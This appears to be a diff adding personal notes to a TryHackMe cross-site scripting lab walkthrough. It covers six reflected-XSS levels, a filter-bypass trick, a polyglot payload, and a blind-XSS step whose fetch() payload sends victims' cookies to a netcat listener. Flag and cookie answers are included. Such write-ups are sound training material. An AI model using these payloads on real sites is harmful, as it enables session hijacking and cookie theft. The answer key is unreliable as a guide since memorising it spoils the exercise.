@@ -118,3 +118,124 @@ The important part of the payload is the "> which closes the value parameter and
 This now closes the input tag properly and allows the JavaScript payload to run:
 Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.
 Level Three:
+You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the textarea tag.
+We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: </textarea><script>alert('THM');</script>
+This turns this:
+Into This:
+The important part of the above payload is </textarea>, which causes the textarea element to close so the script will run.
+Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.
+Level Four:
+Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.
+You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload ';alert('THM');//  which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.
+Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.
+Level Five:
+Now, this level looks the same as level one, and your name also gets reflected in the same place. But if you try the <script>alert('THM');</script> payload, it won't work. When you view the page source, you'll see why.
+The word script  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.
+When a word gets removed from a string, there's a helpful trick that you can try.
+Original Payload:
+<sscriptcript>alert('THM');</sscriptcript>
+Text to be removed (by the filter):
+<sscriptcript>alert('THM');</sscriptcript>
+Final Payload (after passing the filter):
+<script>alert('THM');</script>
+Try entering the payload <sscriptcript>alert('THM');</sscriptcript> and click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.
+Level Six:
+Similar to level two, where we had to escape from the value attribute of an input tag, we can try "><script>alert('THM');</script> , but that doesn't seem to work. Let's inspect the page source to see why that doesn't work.
+You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.
+Let's change our payload to reflect this /images/cat.jpg" onload="alert('THM'); and then viewing the page source, and you'll see how this will work.
+Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful; with this being the last level, you'll receive a flag that can be entered below.
+Polyglots:
+An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
+```text
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
+*level1 <script>alert('THM');</script> XSS Payload Successful*
+*level 2 "><script>alert('THM');</script> XSS Payload Successful*
+*level 3 </textarea><script>alert('THM');</script> XSS Payload Successful*
+*level4 ';alert('THM');// XSS Payload Successful*
+*level5 <sscriptcript>alert('THM');</sscriptcript> XSS Payload Successful*
+*level6  /images/cat.jpg" onload="alert('THM'); XSS Payload Successful*
+*You Completed All The Challenges!
+**THM{XSS_MASTER}***
+*or use jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e   for the all levels*
+### Practical Example (Blind XSS)
+For the last task, we will go over a Blind XSS vulnerability. Ensure you terminate the previous machine and then click on the green Start Machine button on the right to load the Acme IT Support website. You’ll need to use the AttackBox using the blue button at the top of the page. Once loaded, open the link below inside the AttackBox’s Firefox browser to view the target website.
+https://10-10-129-59.p.thmlabs.com
+Click on the Customers tab on the top navigation bar and click the "Signup here" link to create an account. Once your account gets set up, click the Support Tickets tab, which is the feature we will investigate for weaknesses.
+Try creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You'll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket.
+Like task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.
+Let's now go back and create another ticket. Let's see if we can escape the textarea tag by entering the following payload into the ticket contents:
+</textarea>test
+Again, opening the ticket and viewing the page source, we've successfully escaped the textarea tag.
+Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:
+</textarea><script>alert('THM');</script>
+Now when you view the ticket, you should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript.
+Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.
+While using the TryHackMe AttackBox, let's set up a listening server using Netcat:
+nc
+user@machine$ nc -nlvp 9001
+Now that we've set up the method of receiving the exfiltrated information, let's build the payload.
+</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+Let's breakdown the payload:
+The </textarea> tag closes the textarea field.
+The <script>tag opens open an area for us to write JavaScript.
+The fetch() command makes an HTTP request.
+{URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
+?cookie= is the query string that will contain the victim's cookies.
+btoa() command base64 encodes the victim's cookies.
+document.cookie accesses the victim's cookies for the Acme IT Support Website.
+</script>closes the JavaScript code block.
+Now create another ticket using the above payload, making sure to swap out the {URL_OR_IP} variable to your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you'll see the request come through containing the victim's cookies.
+You can now base64 decode this information using a site like https://www.base64decode.org/, giving you the necessary information to answer the below question.
+```text
+</textarea><script>fetch('http://10.10.109.139:9001?cookie=' + btoa(document.cookie) );</script> //thm based
+```
+```text
+nc lvnp 9001
+Listening on [0.0.0.0] (family 0, port 9001)
+Connection from 10.10.67.155 42834 received!
+GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
+Host: 10.10.109.139:9001
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
+Accept: */*
+Origin: http://172.17.0.1
+Referer: http://172.17.0.1/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+*decode c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==
+staff-sessionJB305E55955197693F01D6F8FD2D321*
+What is the value of the staff-session cookie?  *JB305E55955197693F01D6F8FD2D321*
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66743e9fa50b4c5793f070eb505f72d1.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24e50d95cecfc3783bd1a3a4fecbf310.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/1606a13f7fe891c779fe50ea0302afb8.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f371398ba148e07e85b946028e7f6919.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/49444bf865cdc230d9855b53d93745c6.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5458bd5bb617b7e00d9aad9579c030b9.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/21a6597c0964f08c69ebffbf014a886a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/48abb43c885cb5bafff22c714e79b53a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/c3d0d38d23fab0608bc3ca8b9441974c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/77ce8ffc9465731ab834f02292ec86d1.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/80fd5abe95b63ce52ff0ff9f9f6f6d57.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/17c6b9717f16af910557438017be9c53.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9bd2142b2bcd4b4cba34e571550294e4.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8856b113fd514db704157837a6e6aeb4.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3260719921aba8ad6eb8d887094fcb87.png)
+- What is the flag you received from level six? ***THM{XSS_MASTER}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/bd30b2541fb8186755110f5ec3e84330.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/34e69ee3fce3021fee02a13a680d5d47.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/e247f6dd0b2ebe0e4e512b16b41cec05.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/0ad04cf010b889a8adfdba9d24bcb826.png)
+
+## Notes / Lessons Learned
+[[SSRF]]
+
